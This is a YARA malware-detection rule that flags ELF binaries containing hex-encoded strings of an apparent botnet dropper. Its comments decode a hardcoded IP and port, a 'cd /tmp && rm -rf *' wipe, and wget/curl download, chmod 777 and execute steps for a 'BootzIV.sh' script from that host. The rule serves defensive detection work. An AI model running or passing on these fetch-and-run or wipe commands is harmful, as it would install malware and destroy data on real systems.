rule _16bbeec4e23c0dc04c2507ec0d257bf97cfdd025cd86f8faf912cea824b2a5ba { 
    meta : 
        author = "Z4que - All rights reverved"
		date = "21/10/2024"

    strings : 
        $header = { 7F 45 4C 46 }
        
        // 194.87.138.40:700
        $b1 = { 31 39 34 2E 38 37 2E 31 33 38 2E 34 30 3A 37 30 30 }

        // cd /tmp && rm -rf *
        $b2 = { 63 64 20 2F 74 6D 70 20 26 26 20 72 6D 20 2D 72 66 20 2A }

        // wget http://194.87.138.40/BootzIV.sh
        $b3 = { 77 67 65 74 20 68 74 74 70 3A 2F 2F 31 39 34 2E 38 37 2E 31 33 38 2E 34 30 2F 42 6F 6F 74 7A 49 56 2E 73 68 }

        // curl -O http://194.87.138.40/BootzIV.sh
        $b4 = { 63 75 72 6C 20 2D 4F 20 68 74 74 70 3A 2F 2F 31 39 34 2E 38 37 2E 31 33 38 2E 34 30 2F 42 6F 6F 74 7A 49 56 2E 73 68 }

        // chmod 777
        $b5 = { 63 68 6D 6F 64 20 37 37 37 }

        // BootzIV.sh && ./BootzIV.sh
        $b6 = { 42 6F 6F 74 7A 49 56 2E 73 68 20 26 26 20 2E 2F 42 6F 6F 74 7A 49 56 2E 73 68 }

        // /usr/bin/python3
        $b7 = { 2F 75 73 72 2F 62 69 6E 2F 70 79 74 68 6F 6E 33 }

        // /usr/bin/perl
        $b8 = { 2F 75 73 72 2F 62 69 6E 2F 70 65 72 6C }

        // /usr/bin/apt-get
        $b9 = { 2F 75 73 72 2F 62 69 6E 2F 61 70 74 2D 67 65 74 }

        // /usr/lib/portage
        $b10 = { 2F 75 73 72 2F 6C 69 62 2F 70 6F 72 74 61 67 65 }

        // /usr/bin/yum
        $b11 = { 2F 75 73 72 2F 62 69 6E 2F 79 75 6D }

        // /home/landley/work/ab7/build/temp-mips64/gcc-core/gcc
        $b12 = { 2F 68 6F 6D 65 2F 6C 61 6E 64 6C 65 79 2F 77 6F 72 6B 2F 61 62 37 2F 62 75 69 6C 64 2F 74 65 6D 70 2D 6D 69 70 73 36
            34 2F 67 63 63 2D 63 6F 72 65 2F 67 63 63 }

    condition : 
        ( $header at 0 ) 
        and 10 of ( $b* )
        and filesize < 2000KB
}